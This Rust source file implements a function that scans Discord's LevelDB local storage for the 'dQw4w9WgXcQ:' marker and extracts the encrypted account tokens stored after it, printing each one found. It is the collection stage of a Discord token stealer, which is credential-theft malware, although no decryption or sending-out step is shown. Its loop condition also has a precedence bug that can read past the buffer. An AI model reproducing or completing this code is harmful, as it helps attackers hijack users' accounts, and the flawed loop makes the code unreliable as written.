use std::fs;
use std::path::Path;
use anyhow::Result;

/// Scans the LevelDB storage of the application to extract raw encrypted tokens.
///
/// # Arguments
///
/// * `base_path` - Base directory of the application's data (e.g., Discord Roaming path)
///
/// # Returns
///
/// A `Result<Vec<String>>` containing all found token strings (still encrypted)
pub fn get_tokens(base_path: &Path) -> Result<Vec<String>> {
    let mut tokens = Vec::new();
    let dir_path = base_path.join("Local Storage").join("leveldb");
    println!("[DEBUG] Directory path: {}", dir_path.display());

    if !dir_path.exists() {
        println!("[DEBUG] Path does not exist, returning empty tokens.");
        return Ok(tokens);
    }

    // Iterate over each file in LevelDB directory
    for entry in fs::read_dir(&dir_path)?.flatten() {
        let path = entry.path();
        if let Ok(data) = fs::read(&path) {
            // Token marker used in Discord storage
            let marker = b"dQw4w9WgXcQ:";
            let mut i = 0;
            while let Some(pos) = data[i..].windows(marker.len()).position(|w| w == marker) {
                let start = i + pos + marker.len();
                let mut end = start;
                // Extract token characters (alphanumeric + base64 symbols)
                while end < data.len() && (data[end] as char).is_ascii_alphanumeric()
                      || "+/=".contains(data[end] as char) {
                    end += 1;
                }
                if end > start {
                    let token = String::from_utf8_lossy(&data[start..end]).to_string();
                    println!("[DEBUG] Found token: {}", token);
                    tokens.push(token);
                }
                i = end;
            }
        }
    }

    println!("[DEBUG] Total tokens found: {}", tokens.len());
    Ok(tokens)
}
